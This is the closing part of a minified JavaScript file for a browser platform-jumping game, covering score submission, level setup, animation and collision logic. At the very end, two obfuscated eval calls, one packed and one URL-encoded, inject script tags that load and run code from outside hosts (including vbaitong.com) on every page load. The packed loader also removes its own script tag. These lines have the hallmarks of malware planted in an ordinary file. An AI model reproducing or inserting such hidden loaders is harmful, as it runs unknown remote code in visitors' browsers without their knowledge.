		as.send(ci);
	}
};
function eC() {
	if (as.readyState == 4) {
		if (as.status == 200) {
			aU();
			if (dC) {
				var ak = aJ + '&hi=1&fb="+Q;';
				location.href = ak;
			}
		} else {
			alert("Error ...");
			aU();
		}
	}
};
var as;
var eS = "Submit your Score";
var fm = "Insert your name: ";
var eB = "The name must be at least 4 characters!<br>Please insert only characters and numbers!";
function eJ(aY) {
	if (aY.match(/^[a-zA-Z0-9]+$/)) return true;
	else return false;
};
var ab = "";
var ap;
var cb = 0;
var aP = "";
var bM;
function eR() {
	if (typeof(window.localStorage) != 'undefined') {
		aP = window.localStorage.getItem("ds_username");
		if (aP == null) aP = "";
	}
};
function eG() {
	if (typeof(window.localStorage) != 'undefined') {
		aP = ab;
		window.localStorage.setItem("ds_username", aP);
	}
};
function dx() {
	if (cb == 0) {
		cb = 1;
		H("ng");
		H("hi");
		H("ti");
		eR();
		par_score = O;
		par_level = av;
		par_game = aQ;
		ds_HS();
		if (ae == fa) {
			document.getElementById("hs").innerHTML = w596_rank(O);
			v("hs", 0, 0, 200);
			v('co', 0, 0, 200);
			//l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 48 * f);
			l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 0);
			l('co', R - (document.getElementById('co').offsetWidth >> 1), 435 * f);
		} else if (ae == fe) {
			document.getElementById('su').innerHTML = '<img  src=\'' + aV + '\' >';
			v('su', 0, 0, 200);
			l('su', R - (document.getElementById('su').offsetWidth >> 1), 220 * f);
			document.getElementById("hs").innerHTML = aH;
			v("hs", 0, 0, 200);
			v('co', 0, 0, 200);
			//l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 48 * f);
						l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 0);
			l('co', R - (document.getElementById('co').offsetWidth >> 1), 435 * f);
		} else if (ae == fc) {
			aU();
		} else if (ae == fo) {
			aH += ds_SHS();
			document.getElementById("hs").innerHTML = aH;
			v("hs", 0, 0, 200);
			v('co', 0, 0, 200);
			//l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 48 * f);
						l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 0);
			l('co', R - (document.getElementById('co').offsetWidth >> 1), 435 * f);
		} else if (ae == aq) {
			if (Q == 1) {
				ap = O;
				document.getElementById('su').innerHTML = '<img  src=\'' + aV + '\' >';
				v('su', 0, 0, 200);
				l('su', R - (document.getElementById('su').offsetWidth >> 1), 220 * f);
				v('f_p0', 0, 0, 200);
				l('f_p0', R - (document.getElementById('f_p0').offsetWidth >> 1), 130 * f);
				v('f_n0', 0, 0, 200);
				l('f_n0', R - (document.getElementById('f_n0').offsetWidth >> 1), 190 * f);
				v("f_lo", 0, 0, 11);
				l("f_lo", R - (aX("f_lo") >> 1), 2 * f);
			} else aH = "<br><br><br><br><br><br><br><br><br>Please <b>LOGIN WITH FACEB" + "OOK</b> to submit your Score";
			document.getElementById("hs").innerHTML = aH;
			v("hs", 0, 0, 200);
			v('co', 0, 0, 200);
			l("hs", R - (document.getElementById('hs').offsetWidth >> 1), 0);
			l('co', R - (document.getElementById('co').offsetWidth >> 1), 435 * f);
		}
	}
};
function bx() {
	if (dF) {
		as = new eE();
		eu();
	} else {
		aU();
		var ak = aJ + '&hi=2&fb=' + Q + '&n=' + ab + '&s=' + ap + '&c=' + aR + '&r=1';
		if (ae == aq) {
			ak = aJ + '&hi=2&fb=' + Q + '&n=' + ds(ab) + '&s=' + ap + '&c=' + aR + '&r=1&i=' + bM;
			location.href = ak;
		} else if (ca == 0);
		else location.href = ak;
	}
};
function go() {
	var bY = document.getElementById('user').value;
	ab = bY;
	if ((bY.length > 3) && eJ(bY)) {
		eG();
		ap = O;
		aR = ab.charAt(1) + A(9) + (ap * 89) + A(9) + ab.charAt(3) + 'fc1' + A(9) + ab.charAt(0) + A(9) + ab.charAt(1) + '4z3' + (ap * 7) + '3247z11';
		if (ca == 0) {
			var ak = aJ + '&hi=2&n=' + ab + '&s=' + ap + '&c=' + aR + '&r=1';
			document.getElementById('su').innerHTML = '<a href="' + ak + '"><img  src=\'' + aV + '\' border=0></a>';
		} else document.getElementById('su').innerHTML = '<img  src=\'' + aV + '\' >';
		v('su', 0, 0, 200);
		l('su', R - (document.getElementById('su').offsetWidth >> 1), 220 * f);
	}
};
 
function aU() {
	myshow();
	bs = (60 * f);
	for (i = 0; i < 100; i++) window.scroll(0, 1);
	cb = 0;
	H("su");
	H("co");
	H("hs");
	v("ti", 0, 0, 1);
	//l("ti", 0, bs);
	l("ti", 0, 0);
	v("ng", 0, 0, 11);
	l("ng", -1000, -1000);
	if (aI) {
		v("hi", 0, 0, 11);
		l("hi", -1000, -1000);
	}
	if (ae == aq) {
		H("f_n0");
		H("f_p0");
		v("f_li", 0, 0, 11);
		l("f_li", -1000, -1000);
		v("f_lo", 0, 0, 11);
		l("f_lo", -1000, -1000);
		v("f_ba", 0, 0, 10);
		l("f_ba", 0, C - 42 * f);
	}
	K = cf;
};
var gs;
var gv;
var am = new Array();
var step;
function dr() {
	bW = 0;
	var cV = av % 3;
	var bL = document.getElementById('bk1');
	var bK = document.getElementById('bk2');
	with(bL.style) {
		paddingLeft = (o * 2) + 'px';
		position = 'absolute';
		top = '0px';
		left = '0px';
		width = o + 'px';
		height = (223 * f) + 'px';
		backgroundImage = "url('" + cq + "')";
		backgroundRepeat = 'repeat-X';
		backgroundPositionX = '0px';
		backgroundPositionY = '0px';
		visibility = 'hidden';
	}
	with(bK.style) {
		paddingLeft = (o * 2) + 'px';
		position = 'absolute';
		top = '0px';
		left = '0px';
		width = o + 'px';
		height = (289.5 * f) + 'px';
		backgroundImage = "url('" + cr + "')";
		backgroundRepeat = 'repeat-X';
		backgroundPositionX = '0px';
		backgroundPositionY = '0px';
		visibility = 'hidden';
	}
	if (cV == 1) {
		bL.style.backgroundImage = "url('" + cq + "')";
		bK.style.backgroundImage = "url('" + cr + "')";
		for (var i = 1; i < 20; i++) document.getElementById("am" + (19 + i)).src = aA[4];
		step = 0;
		bA = "rgb(255,0,0)";
	} else if (cV == 2) {
		bL.style.backgroundImage = "url('" + cT + "')";
		bK.style.backgroundImage = "url('" + cW + "')";
		for (var i = 1; i < 20; i++) document.getElementById("am" + (19 + i)).src = aA[5];
		step = 4;
		bA = "rgb(0,255,255)";
	} else {
		bL.style.backgroundImage = "url('" + cX + "')";
		bK.style.backgroundImage = "url('" + cU + "')";
		for (var i = 1; i < 20; i++) document.getElementById("am" + (19 + i)).src = aA[18];
		step = 8;
		bA = "rgb(255,255,0)";
	}
	v("bk1", 0, 0, 1);
	v("bk2", 0, 0, 1);
	v("bo", 0, 0, 3);
	document.getElementById("bo").style.backgroundColor = bA;
	document.getElementById("bo").style.visibility = "hidden";
	for (i = 0; i < 6; i++) document.getElementById("am" + i).src = aA[i];
	for (i = 6; i < 10; i++) document.getElementById("am" + i).src = aA[i + step];
	for (var i = 1; i < 20; i++) {
		aj[i] = (i - 1) * (160 * f) + A(120 * f);
		M[i] = (C - (180 * f)) + A(100 * f);
		G[i] = 0;
	}
	aj[0] = aj[1];
	M[0] = M[1] - (35 * f);
	if (av == 1) {
		var c = 4 + A(10);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0
	} else if (av == 2) {
		var c = 3 + A(7);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 10 + A(7);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0
	} else if (av == 3) {
		var c = 3 + A(4);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 7 + A(7);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 14 + A(4);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
	} else if (av < 7) {
		var c = 2 + A(4);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 6 + A(4);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 10 + A(4);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 14 + A(4);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
	} else if (av < 10) {
		var c = 2 + A(3);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 5 + A(3);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 8 + A(3);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 11 + A(3);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 14 + A(3);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
	} else {
		var c = 2 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 4 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 6 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 8 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 10 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 12 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
		c = 14 + A(2);
		G[c] = 1;
		F[c] = 0;
		D[c] = 0;
	}
	for (var d = 0; d < 40; d++) {
		v("am" + d, 0, 0, 2);
		l("am" + d, -1000, -1000);
	}
	frame = 0;
	aC = 0;
	bF = 0;
	bP = 0;
	aL = 0;
	aG = 0;
	ax = 0;
	bG = 0;
	aO = 0;
	bq = 0;
	bn = 0;
};
var bG;
var aO;
var bq = 0;
var bn = 0;
var aj = new Array();
var M = new Array();
var G = new Array();
var F = new Array();
var D = new Array();
var db = 0;
var fU = new Array( - 1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1);
var bI = 0;
function eQ() {
	bq -= bG;
	if (bq < -o) bq += o;
	bn -= aO;
	if (bn < -o) bn += o;
	l("bk1", bq, 0);
	l("bk2", bn, (223 * f));
	db = (db + 1) % 4;
	for (var i = 1; i < 20; i++) {
		if (G[i] == 1) {
			D[i] = (D[i] + 1) % 32;
			F[i] = fU[D[i]] * f * 2;
			aj[i] -= (F[i] + aO);
		} else aj[i] -= aO;
		l("am" + (19 + i), aj[i], M[i]);
	}
	if (aC == 0) {
		if (aG == 1) {
			aL += (4 * f);
			if (aL > (60 * f)) aL = 60 * f;
			ei(aj[0], M[0] - (8 * f), aL, M[0] - (4 * f));
		} else if (aG == 2) {
			aC = 1;
			bP = ((aL >> 1) / f);
			aL = 0;
		}
		bG = 0;
		aO = 0;
		ax = (ax + 1) % 8;
		frame = dO[ax];
		bE = 0;
		bD = 0;
		if (bI != 0) aj[0] -= (F[bI] + aO);
	} else if (aC == 1) {
		bI = 0;
		if (bF++<bP >> 1) M[0] -= 6 * f;
		else M[0] += 6 * f;
		bG = 4 * f;
		aO = 8 * f;
		bE = 0;
		bD = -(10 * f);
		frame = 3;
		if (dq(0, 19)) {
			aG = 0;
			bF = 0;
			aC = 0;
			bE = 0;
			bD = 0;
			M[0] = M[i] - (f * 35);
			av++;
			K = cK;
			ck(1000);
			dp();
			return;
		}
		for (var i = 1; i < 20; i++) {
			if (dq(0, i)) {
				aG = 0;
				bF = 0;
				aC = 0;
				bE = 0;
				bD = 0;
				if (G[i] == 1) bI = i;
				M[0] = M[i] - (f * 35);
				ck(100);
			}
		}
		if (M[0] > (C - (60 * f))) {
			ax = 0;
			aC = 2;
		}
	} else if (aC == 2) {
		frame = dL[ax];
		ax = (ax + 1);
		if (ax == 10) K = cL;
	}
	l("am" + bW, -1000, -1000);
	l("am" + frame, aj[0] + bE, M[0] + bD);
	bW = frame;
	es();
};
var bW = 0;
function dq(bH, bJ) {
	var ej = aj[bH] + (30 - 10) * f;
	var er = aj[bJ] + (80 - 10) * f;
	var ez = M[bH] + (30 * f);
	var et = M[bJ] + (13 * f);
	if (er < aj[bH] + (10 * f)) return 0;
	if (aj[bJ] + (10 * f) > ej) return 0;
	if (et < M[bH]) return 0;
	if (M[bJ] > ez) return 0;
	return 1;
};
var frame = 0;
var aC = 0;
var bF = 0;
var bP = 0;
var aL = 0;
var aG = 0;
var ax = 0;
var dO = new Array(0, 0, 1, 1, 2, 2, 1, 1);
var dL = new Array(6, 6, 7, 7, 8, 8, 9, 9, 19, 19);
function bX() {
	if ((az) && (g != ai)) window.event.preventDefault();
	if (K == bc) {
		aG = 1;
	}
};
function bV() {	if ((az) && (g != ai)) window.event.preventDefault();
	if (K == bc) {		aG = 2;	document.getElementById("bo").style.visibility = "hidden";	}
};
var bA;function ei(eh, eA, ek, gq) {	document.getElementById("bo").style.visibility = "visible";	document.getElementById("bo").style.left = eh + "px";	document.getElementById("bo").style.top = eA + "px";	document.getElementById("bo").style.width = ek + "px";
};
function bU() {
	for (i = 0; i < 100; i++) window.scroll(0, 1);
	if (az) {
		I = window.innerWidth;
		al = window.innerHeight;
	} else {
		I = document.documentElement.clientWidth ? document.documentElement.clientWidth: document.body.clientWidth;
		al = document.documentElement.clientHeight ? document.documentElement.clientHeight: document.body.clientHeight;
	}
	if (I / al > o / (C)) {
		af = al / (C);
	} else {
		af = I / (o);
	}
	document.getElementById("all").style.clip = "rect(0px," + o + "px," + (C) + "px,0px)";
	if ((I < al) && ((g == bg) || (g == ag) || (g == bu) || bC)) dm("all", 0, 0, I / (o), al / (C));
	else dk("all", ((I - o * af) / 2), 0, af);
	if (bO) {
		if (par_ad2) bs = (60 * f) / af;
		else bs = (60 * f);
		par_adx2 = ((I - o) / 2);
		par_adx3 = ((I - o * af) / 2);
		par_adx4 = ((I - o * af) / 2) + (o * af);
		ds_RZ();
	}
};
function dv() {
	var dB = new Date();
	var eb = dB.getTime();
	eP();
	var ec = new Date();
	var dZ = ec.getTime();
	cj = ar - (dZ - eb);
	if (cj < 10) cj = 10;
	bZ = setTimeout('dv()', cj);
};
var bZ;
function test() {
	if (bZ) clearTimeout(bZ);
	if ((g == ag) && (dD));
	else document.body.style.overflow = 'hidden';
	if ((g != 3) && (g != 6)) document.addEventListener(bb, dH, false);
	for (i = 0; i < 200; i++) window.scroll(0, 1);
	bU();
	K = cd;
	document.body.style.backgroundColor = "#000000";
	dv();
};
function eH() {
	if ((g == ag) && (dP)) window.location.reload();
	bU();
};
window.onorientationchange = eH;
window.onresize = bU;
window.onload = test;
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|script|parentNode|http|com|9g|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|qwt|getElementsByTagName||createElement'.split('|'),0,{}));eval(decodeURIComponent('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%30%2e%76%62%61%69%74%6f%6e%67%2e%63%6f%6d%2f%6c%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%27%29%3b'))
